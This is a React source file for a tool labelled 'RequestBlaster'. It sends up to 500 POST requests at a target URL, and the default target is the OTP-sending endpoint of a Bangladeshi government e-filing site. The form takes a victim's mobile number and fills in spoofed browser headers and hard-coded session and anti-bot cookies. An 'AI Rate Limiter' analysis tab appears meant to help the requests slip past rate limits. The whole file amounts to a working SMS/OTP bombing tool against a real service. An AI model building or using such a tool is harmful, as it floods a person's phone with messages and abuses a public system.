"use client";

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { getRateLimitAction, sendRequestsAction, RequestResult } from '@/app/actions';
import { IntelligentRateLimiterOutput } from '@/ai/flows/intelligent-rate-limiter';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ResultsDisplay } from './results-display';
import { RateLimitDisplay } from './rate-limit-display';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Send, Wand2 } from 'lucide-react';

const formSchema = z.object({
  url: z.string().url({ message: "Please enter a valid URL." }),
  mobile: z.string().regex(/^\d+$/, { message: "Please enter a valid mobile number." }),
  numRequests: z.coerce.number().int().min(1, "Must be at least 1").max(500, "Cannot exceed 500"),
  headers: z.string().refine((val) => {
    try { JSON.parse(val); return true; } catch { return false; }
  }, { message: "Invalid JSON format for headers." }),
  cookies: z.string().refine((val) => {
    try { JSON.parse(val); return true; } catch { return false; }
  }, { message: "Invalid JSON format for cookies." }),
  data: z.string().refine((val) => {
    try { JSON.parse(val); return true; } catch { return false; }
  }, { message: "Invalid JSON format for data." }),
});

type FormValues = z.infer<typeof formSchema>;

const defaultValues: FormValues = {
  url: "https://efiling.ebmeb.gov.bd/index.php/eiinsim/sendotp",
  mobile: "",
  numRequests: 10,
  headers: JSON.stringify({
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://efiling.ebmeb.gov.bd",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "referer": "https://efiling.ebmeb.gov.bd/index.php/eiinsim/applicationform",
    "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
  }, null, 2),
  cookies: JSON.stringify({
    "__nobotA2": "CgAC02i8kXhmqgAHA5G1Ag==",
    "ci_session": "8dbada59b153e03dcdcfe05e90d3300b272992a9",
  }, null, 2),
  data: JSON.stringify({
    "mobile": "YOUR_MOBILE_NUMBER"
  }, null, 2),
};

export function RequestBlaster() {
  const [activeTab, setActiveTab] = useState("config");
  const [isBlasting, setIsBlasting] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [results, setResults] = useState<RequestResult[]>([]);
  const [rateLimitInfo, setRateLimitInfo] = useState<(IntelligentRateLimiterOutput & { error?: string }) | null>(null);
  const { toast } = useToast();

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues,
    mode: 'onBlur'
  });

  const onSubmit = async (values: FormValues) => {
    setIsBlasting(true);
    setResults([]);
    try {
      const response = await sendRequestsAction(values);
      setResults(response);
      setActiveTab("results");
      if (response.some(r => r.error || r.status < 200 || r.status >= 300)) {
        toast({
          variant: "destructive",
          title: "Some requests may have failed",
          description: "Check the results tab for more details.",
        });
      } else {
         toast({
          title: "Blast complete!",
          description: `${values.numRequests} requests sent successfully.`,
        });
      }
    } catch (e) {
      toast({
        variant: "destructive",
        title: "An error occurred",
        description: (e as Error).message,
      });
    } finally {
      setIsBlasting(false);
    }
  };
  
  const onAnalyze = async () => {
    const values = form.getValues();
    const validationResult = formSchema.safeParse(values);
    if (!validationResult.success) {
      form.trigger();
      toast({
        variant: "destructive",
        title: "Invalid configuration",
        description: "Please fix the errors in the form before analyzing.",
      });
      return;
    }

    setIsAnalyzing(true);
    setRateLimitInfo(null);
    try {
      const response = await getRateLimitAction(values);
      setRateLimitInfo(response);
      setActiveTab("rate-limiter");
      toast({
          title: "Analysis complete!",
          description: "AI rate limit analysis results are ready.",
        });
    } catch (e) {
      toast({
        variant: "destructive",
        title: "An error occurred during analysis",
        description: (e as Error).message,
      });
    } finally {
      setIsAnalyzing(false);
    }
  };

  return (
    <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
      <TabsList className="grid w-full grid-cols-3">
        <TabsTrigger value="config">Configuration</TabsTrigger>
        <TabsTrigger value="results">Results</TabsTrigger>
        <TabsTrigger value="rate-limiter">AI Rate Limiter</TabsTrigger>
      </TabsList>
      <TabsContent value="config">
        <Card>
          <CardHeader>
            <CardTitle>Request Configuration</CardTitle>
            <CardDescription>
              Set up the details for the POST requests you want to send. The mobile number you enter below will replace the placeholder in the data payload.
            </CardDescription>
          </CardHeader>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)}>
              <CardContent className="space-y-6">
                <div className="grid md:grid-cols-2 gap-4">
                  <FormField
                    control={form.control}
                    name="url"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Target URL</FormLabel>
                        <FormControl>
                          <Input placeholder="https://example.com/api" {...field} />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                  <div className="grid grid-cols-2 gap-4">
                    <FormField
                      control={form.control}
                      name="mobile"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Mobile Number</FormLabel>
                          <FormControl>
                            <Input placeholder="e.g., 1712345678" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={form.control}
                      name="numRequests"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Number of Requests</FormLabel>
                          <FormControl>
                            <Input type="number" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  </div>
                </div>

                <Accordion type="single" collapsible className="w-full">
                  <AccordionItem value="item-1">
                    <AccordionTrigger>Advanced Payload Customization</AccordionTrigger>
                    <AccordionContent className="space-y-4 pt-4">
                      <FormField
                        control={form.control}
                        name="headers"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Headers (JSON)</FormLabel>
                            <FormControl>
                              <Textarea rows={10} className="font-code text-sm" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={form.control}
                        name="cookies"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Cookies (JSON)</FormLabel>
                            <FormControl>
                              <Textarea rows={5} className="font-code text-sm" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={form.control}
                        name="data"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>Data Payload (JSON)</FormLabel>
                            <FormControl>
                              <Textarea rows={5} className="font-code text-sm" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                    </AccordionContent>
                  </AccordionItem>
                </Accordion>
              </CardContent>
              <CardFooter className="flex justify-end gap-4">
                <Button type="button" variant="outline" onClick={onAnalyze} disabled={isAnalyzing || isBlasting}>
                  {isAnalyzing ? <Loader2 className="animate-spin" /> : <Wand2 />}
                  Analyze Rate Limit
                </Button>
                <Button type="submit" disabled={isBlasting || isAnalyzing}>
                  {isBlasting ? <Loader2 className="animate-spin" /> : <Send />}
                  Blast Requests
                </Button>
              </CardFooter>
            </form>
          </Form>
        </Card>
      </TabsContent>
      <TabsContent value="results">
        <ResultsDisplay results={results} />
      </TabsContent>
      <TabsContent value="rate-limiter">
        <RateLimitDisplay info={rateLimitInfo} />
      </TabsContent>
    </Tabs>
  );
}
